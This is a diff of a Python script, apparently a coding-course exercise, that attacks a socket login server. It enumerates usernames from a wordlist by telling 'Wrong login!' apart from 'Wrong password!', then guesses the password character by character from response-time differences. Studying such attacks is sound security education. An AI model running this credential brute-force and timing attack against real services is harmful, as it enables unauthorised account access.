@@ -1,34 +1,74 @@
 import sys
 import socket
 import itertools
+import json
+from datetime import datetime
 
-passwords_list = []
+logins = []
 
-with open('hacking/passwords.txt', 'r', encoding='utf-8') as f:
+with open('hacking/logins.txt', 'r', encoding='utf-8') as f:
     for line in f:
-        passwords_list.append(line.strip())
+        logins.append(line.strip())
 
-address = (sys.argv[1], int(sys.argv[2]))
+symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
 
 def generate_password():
-    for password in passwords_list:
-        yield from itertools.product(*zip(password.lower(), password.upper()))
+    index = 1
+    while True:
+        yield from itertools.product(symbols, repeat=index)
+        index += 1
 
 
 with socket.socket() as sock:
-    sock.connect(address)
+    sock.connect((sys.argv[1], int(sys.argv[2])))
+    creds = {'login': '', 'password': ' '}
 
-    for p in generate_password():
-        password = "".join(p)
-        sock.send(password.encode())
+    for login in logins:
+        creds['login'] = login
+        json_creds = json.dumps(creds, indent=4)
+        sock.send(json_creds.encode())
+        json_response = sock.recv(1024).decode()
+        response = json.loads(json_response)
 
-        response = sock.recv(1024).decode()
-        if response == 'Connection success!':
-            print(password)
-            break
-        if response == 'Wrong password!':
+        if response['result'] == 'Wrong login!':
             continue
-        if response == 'Too many attempts':
-            print(response)
+        if response['result'] == 'Wrong password!':
             break
+
+    while True:
+        is_success = False
+        for c in symbols:
+            old_pas = creds['password']
+
+            if creds['password'] == ' ':
+                creds['password'] = c
+            else:
+                creds['password'] = creds['password'] + c
+
+            json_creds = json.dumps(creds, indent=4)
+
+            start = datetime.now()
+
+            sock.send(json_creds.encode())
+            json_response = sock.recv(1024).decode()
+
+            finish = datetime.now()
+            difference = finish - start
+
+            response = json.loads(json_response)
+
+            if response['result'] == 'Connection success!':
+                is_success = True
+                break
+
+            if difference.microseconds >= 100000:
+                continue
+            else:
+                creds['password'] = old_pas
+                continue
+
+        if is_success:
+            break
+
+    print(json.dumps(creds))
